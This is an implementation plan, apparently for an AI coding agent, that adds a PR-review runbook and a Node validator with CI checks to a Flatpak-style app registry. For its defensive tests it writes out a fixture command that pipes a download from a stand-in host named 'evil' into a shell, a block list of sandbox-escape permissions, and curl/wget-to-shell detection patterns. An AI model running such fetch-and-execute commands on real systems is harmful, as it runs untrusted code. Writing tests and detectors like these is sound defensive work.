# PR Review Spec — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Land the PR-review spec as three artifacts — an agent-executable runbook doc, public/contributor copy, and deterministic CI guardrails — per `docs/superpowers/specs/2026-06-22-pr-review-spec-design.md`.

**Architecture:** The runbook + template are documentation transcribed from the spec. The guardrails are a single dependency-free Node validator (`scripts/audit-descriptor.mjs`) that parses a descriptor and its manifest and emits hard FAILs (exit 1) or WARNs (exit 0), wired into `pr-checks.yml`; plus a CI tripwire job for infra/resolver changes. License is never the trust axis — provenance tier is.

**Tech Stack:** Node ESM (`.mjs`, no npm deps — the PR gate validates before `npm ci`), Bash test scripts under `tests/` using `tests/lib/assert.sh`, GitHub Actions.

## Global Constraints

- Scripts invoked by the core pipeline must be **dependency-free Node** (no `import` of npm packages); `pr-checks.yml` runs `node scripts/*.mjs` before any `npm ci`. Verbatim parse style: follow `scripts/read-descriptor.mjs` (manual line scan, not a YAML lib).
- Tests are `tests/test_*.sh`, discovered by `tests/run-tests.sh`, using helpers from `tests/lib/assert.sh` (`assert_eq`, `assert_file`, `assert_contains`, `assert_ok`). Build-step tests self-skip without `flatpak-builder`.
- Guardrail exit contract: **exit 1** on any hard failure, **exit 0** when only warnings. Hard FAIL lines to stderr prefixed `FAIL:`, warnings prefixed `WARN:`.
- Hard checks must trip **no existing registry app** (all 6 must still pass). Warn-only: G2(b) declaration-consistency, G3 runtime-fetch.
- Provenance tiers, not license. AppImage is a rejected artifact type. `update.command` must match `^\./[A-Za-z0-9._-]+$`.
- Commit messages end with the `Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>` trailer.

---

## File structure

- Create `docs/pr-review.md` — the runbook (Phases 0–7) + review template table (single source of truth).
- Modify `site/src/content/pages/policies.md` — expand Review section to the provenance model; drop AppImage from "What we host".
- Modify `site/src/content/pages/contributing.md` — append "What we review (and what gets a PR rejected)" pre-flight checklist.
- Create `scripts/audit-descriptor.mjs` — guardrails G1, G2(a/b), G3, update.command check.
- Create `tests/test_audit_descriptor.sh` — fixtures (pass/fail) + regression over real registry manifests.
- Create `tests/fixtures/audit/*` — minimal good/bad descriptor+manifest pairs.
- Modify `.github/workflows/pr-checks.yml` — call `audit-descriptor.mjs` per descriptor; add G4 infra/resolver tripwire job.

---

## Task 1: Runbook doc (`docs/pr-review.md`)

**Files:**
- Create: `docs/pr-review.md`

**Interfaces:**
- Produces: the canonical runbook that 2a/2b and the guardrails reference.

- [ ] **Step 1:** Write `docs/pr-review.md` containing, verbatim from the spec: a one-paragraph purpose + "never execute untrusted code" banner; the Phase 0–7 runbook (spec §4); the provenance-tier model (spec §3); the decision rubric (spec §5); and the review template table (spec §7) as the copy-per-PR checklist. Open with how to run it ("review PR #N → copy the template → work top to bottom → output filled template + drafted comment; recommend only, human merges").
- [ ] **Step 2:** Verify it renders as valid markdown and the template table has all 30 rows.

Run: `node -e "const t=require('fs').readFileSync('docs/pr-review.md','utf8'); if(!t.includes('| 7.3 |')) process.exit(1)"`
Expected: exit 0.

- [ ] **Step 3: Commit**

```bash
git add docs/pr-review.md
git commit -m "docs: add agent-executable PR review runbook + template

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 2: Public + contributor copy

**Files:**
- Modify: `site/src/content/pages/policies.md`
- Modify: `site/src/content/pages/contributing.md`

**Interfaces:**
- Consumes: the provenance model + rubric from Task 1 (link target `/pr-review/` or repo path).

- [ ] **Step 1:** In `policies.md`, rewrite "What we host" to drop **AppImage** (current line lists "an installer, AppImage, `.deb`, `.rpm`, or tarball"), and expand "Review" to the provenance statement (spec §8.2a): source-built verified where possible OR official upstream prebuilt repackaged unmodified; official channel only; non-FOSS allowed; checksum-pinned; sandbox-escape perms rejected; unofficial/modified binaries rejected. Do not imply every FOSS prebuilt is byte-verified.
- [ ] **Step 2:** In `contributing.md`, append a "What we review (and what gets a PR rejected)" section — the §8.2b pre-flight checklist (pin per type; official URLs; don't modify vendor payload/behavior; `update.command` is `./resolve-update.sh`; declare `policy.proprietary`/`dangerous_permissions`; no runtime fetch-and-exec of arbitrary code; no escape perms; no AppImage; legitimate purpose).
- [ ] **Step 3:** Verify the site builds.

Run: `cd site && npm run build`
Expected: build succeeds (exit 0).

- [ ] **Step 4: Commit**

```bash
git add site/src/content/pages/policies.md site/src/content/pages/contributing.md
git commit -m "site: publish provenance-based review bar; drop AppImage

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 3: `audit-descriptor.mjs` — G1 source-pinning (per type)

**Files:**
- Create: `scripts/audit-descriptor.mjs`
- Create: `tests/fixtures/audit/good/` (flatpark.yml + manifest, fully pinned)
- Create: `tests/fixtures/audit/bad-unpinned/` (extra-data missing sha256)
- Create: `tests/test_audit_descriptor.sh`

**Interfaces:**
- Produces: `node scripts/audit-descriptor.mjs <flatpark.yml>` → exit 1 on hard fail, 0 otherwise; `FAIL:`/`WARN:` lines on stderr. Parses descriptor (`build.manifest`, `update.command`, `policy.{proprietary,dangerous_permissions}`) and the referenced manifest (`finish-args`, `modules[].sources[]`, `build-commands`).

- [ ] **Step 1: Write the failing test** (`tests/test_audit_descriptor.sh`)

```bash
#!/usr/bin/env bash
set -u
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$ROOT/tests/lib/assert.sh"
AUDIT="node $ROOT/scripts/audit-descriptor.mjs"
F="$ROOT/tests/fixtures/audit"

# G1: a fully-pinned descriptor passes
$AUDIT "$F/good/flatpark.yml"; assert_eq "$?" "0"

# G1: extra-data without sha256 hard-fails
out="$($AUDIT "$F/bad-unpinned/flatpark.yml" 2>&1)"; rc=$?
assert_eq "$rc" "1"
printf '%s' "$out" | grep -qF "FAIL:" || { echo "FAIL: expected FAIL line"; exit 1; }
echo "ok test_audit_descriptor (G1)"
```

- [ ] **Step 2:** Create fixtures. `good/flatpark.yml` (minimal: id/name/summary, `build.manifest: m.yml`, `update.command: ./resolve-update.sh`, `policy.dangerous_permissions: []`) + `good/m.yml` with one `type: extra-data` source having `sha256` + non-zero `size`, conservative finish-args. `bad-unpinned/` identical but the source omits `sha256`.

- [ ] **Step 3: Run test to verify it fails**

Run: `bash tests/test_audit_descriptor.sh`
Expected: FAIL (script not found / wrong exit).

- [ ] **Step 4: Write minimal implementation** — `scripts/audit-descriptor.mjs` with the descriptor+manifest parser (mirroring `read-descriptor.mjs` style) and the G1 rule: for each manifest source, `git`→require `commit`; `archive`→require `sha256`; `extra-data`→require `sha256` and `size`≠`0`; `file`/`script`/`patch`/`dir`/`shell`→skip; unknown→`WARN`. Collect `fails[]`/`warns[]`, print them, `process.exit(fails.length ? 1 : 0)`.

- [ ] **Step 5: Run test to verify it passes**

Run: `bash tests/test_audit_descriptor.sh`
Expected: `ok test_audit_descriptor (G1)`.

- [ ] **Step 6: Commit**

```bash
git add scripts/audit-descriptor.mjs tests/test_audit_descriptor.sh tests/fixtures/audit
git commit -m "scripts: add audit-descriptor with G1 per-type source pinning

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 4: G2 finish-args (escape hard-fail + declaration warn) + update.command check

**Files:**
- Modify: `scripts/audit-descriptor.mjs`
- Modify: `tests/test_audit_descriptor.sh`
- Create: `tests/fixtures/audit/bad-escape/` (manifest with `--filesystem=host`)
- Create: `tests/fixtures/audit/bad-updatecmd/` (descriptor with non-relative `update.command`)

**Interfaces:**
- Consumes: parser + `fails`/`warns` from Task 3.

- [ ] **Step 1: Write the failing tests** — append:

```bash
# G2(a): escape permission hard-fails
out="$($AUDIT "$F/bad-escape/flatpark.yml" 2>&1)"; assert_eq "$?" "1"
printf '%s' "$out" | grep -qF "filesystem=host" || { echo "FAIL: escape perm not reported"; exit 1; }

# update.command must be a simple relative path
out="$($AUDIT "$F/bad-updatecmd/flatpark.yml" 2>&1)"; assert_eq "$?" "1"
printf '%s' "$out" | grep -qiF "update.command" || { echo "FAIL: update.command not reported"; exit 1; }
echo "ok test_audit_descriptor (G2 + update.command)"
```

- [ ] **Step 2:** Create `bad-escape/` (finish-args includes `- --filesystem=host`) and `bad-updatecmd/` (`update.command: bash -c 'curl evil|sh'`).
- [ ] **Step 3: Run to verify it fails.** Run: `bash tests/test_audit_descriptor.sh` → FAIL.
- [ ] **Step 4: Implement** — add to the script: (a) escape-perm hard-fail set `['--talk-name=org.freedesktop.Flatpak','--filesystem=host','--filesystem=/']` → any present finish-arg in set → `FAIL`; (b) declaration-consistency warn set `['--device=all','--filesystem=home']` → if present and not in `policy.dangerous_permissions` → `WARN`; and the `update.command` regex `^\./[A-Za-z0-9._-]+$` → else `FAIL`.
- [ ] **Step 5: Run to verify it passes.** Run: `bash tests/test_audit_descriptor.sh` → ok.
- [ ] **Step 6: Commit**

```bash
git add scripts/audit-descriptor.mjs tests/test_audit_descriptor.sh tests/fixtures/audit
git commit -m "scripts: audit G2 escape-perm hard-fail + warn + update.command check

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 5: G3 runtime-fetch warning

**Files:**
- Modify: `scripts/audit-descriptor.mjs`
- Modify: `tests/test_audit_descriptor.sh`
- Create: `tests/fixtures/audit/warn-runtimefetch/` (build-command with `npm install`)

**Interfaces:**
- Consumes: parser + `warns` from Task 3/4.

- [ ] **Step 1: Write the failing test** — append:

```bash
# G3: runtime npm install warns but does NOT fail
out="$($AUDIT "$F/warn-runtimefetch/flatpark.yml" 2>&1)"; rc=$?
assert_eq "$rc" "0"
printf '%s' "$out" | grep -qF "WARN:" || { echo "FAIL: expected WARN line"; exit 1; }
echo "ok test_audit_descriptor (G3)"
```

- [ ] **Step 2:** Create `warn-runtimefetch/` with a build-command `- npm install --prefix x peerflix` (otherwise valid, pinned).
- [ ] **Step 3: Run to verify it fails.** Run: `bash tests/test_audit_descriptor.sh` → FAIL (no warn yet).
- [ ] **Step 4: Implement** — grep `build-commands` (and any `*.sh`/wrapper files in the descriptor dir) for `/\bnpm install\b/`, `/\bpip install\b/`, `/curl[^\n]*\|\s*sh/`, `/wget[^\n]*\|\s*sh/` → `WARN` (never fail; vendor self-updaters are expected here).
- [ ] **Step 5: Run to verify it passes.** Run: `bash tests/test_audit_descriptor.sh` → ok.
- [ ] **Step 6: Commit**

```bash
git add scripts/audit-descriptor.mjs tests/test_audit_descriptor.sh tests/fixtures/audit
git commit -m "scripts: audit G3 runtime fetch-and-exec warning

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 6: Regression — every existing registry app passes

**Files:**
- Modify: `tests/test_audit_descriptor.sh`

**Interfaces:**
- Consumes: the finished `audit-descriptor.mjs`.

- [ ] **Step 1: Write the test** — append: loop all real descriptors, assert exit 0 (no hard fail on shipping apps):

```bash
for d in "$ROOT"/registry/*/flatpark.yml; do
  $AUDIT "$d" >/dev/null 2>&1 || { echo "FAIL: audit hard-failed on shipping app $d"; exit 1; }
done
echo "ok test_audit_descriptor (registry regression)"
```

- [ ] **Step 2: Run.** Run: `bash tests/test_audit_descriptor.sh`. Expected: ok. If any real app hard-fails, the parser or a rule is wrong — fix the script (not the app), re-run.
- [ ] **Step 3: Run the whole suite.** Run: `bash tests/run-tests.sh`. Expected: all `ok`, exit 0.
- [ ] **Step 4: Commit**

```bash
git add tests/test_audit_descriptor.sh
git commit -m "test: audit-descriptor passes on all shipping registry apps

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Task 7: Wire into CI + G4 infra/resolver tripwire

**Files:**
- Modify: `.github/workflows/pr-checks.yml`

**Interfaces:**
- Consumes: `audit-descriptor.mjs`.

- [ ] **Step 1:** In the `lint-and-test` job, after the descriptor-validate loop, add a step that runs `node scripts/audit-descriptor.mjs "$d"` for every `registry/*/flatpark.yml` (fails the job on exit 1; warnings are printed).
- [ ] **Step 2:** Add a `guard-infra` job (no secrets, `contents: read`) that computes changed paths against the PR base and **fails with a "needs maintainer review" message** if any changed path matches `^\.github/`, `^scripts/`, signing config, `registry/.*/resolve-update\.sh`, or if a changed `flatpark.yml` alters `update.command`. Use `scripts/changed-apps.sh`'s base-sha pattern / `git diff --name-only`.
- [ ] **Step 3: Validate the workflow YAML.**

Run: `node -e "require('fs').readFileSync('.github/workflows/pr-checks.yml','utf8')"` and (if available) `npx --yes yaml-lint .github/workflows/pr-checks.yml || true`
Expected: no parse error.

- [ ] **Step 4: Commit**

```bash
git add .github/workflows/pr-checks.yml
git commit -m "ci: run audit-descriptor per app + infra/resolver-change tripwire

Co-Authored-By: Claude Opus 4.8 (1M context) <noreply@anthropic.com>"
```

---

## Self-Review

- **Spec coverage:** §3 provenance model → Task 1 doc + tiers drive rubric; §4 runbook → Task 1; §7 template → Task 1; §8.2a → Task 2 policies.md (+AppImage drop); §8.2b → Task 2 contributing.md; §9 G1 → Task 3; G2(a/b) + update.command → Task 4; G3 → Task 5; G4 → Task 7; regression (no false-fail of shipping apps) → Task 6. Backlog items (dangerous_permissions schema, reproducible-build, AppImage-reject descriptor check, XXE metainfo, `eval` removal) intentionally deferred per spec §9/§11.
- **Placeholder scan:** each code step shows the test or the rule set; fixtures enumerated; exit contract fixed in Global Constraints.
- **Type consistency:** the script's contract (exit code + `FAIL:`/`WARN:` prefixes) is identical across Tasks 3–7; tests assert on those exact prefixes.
- **Note:** AppImage-as-artifact and Tier-2 official-host checks are runbook/human judgments this round (backlog for automation), so no guardrail task asserts them — consistent with spec §9 backlog.
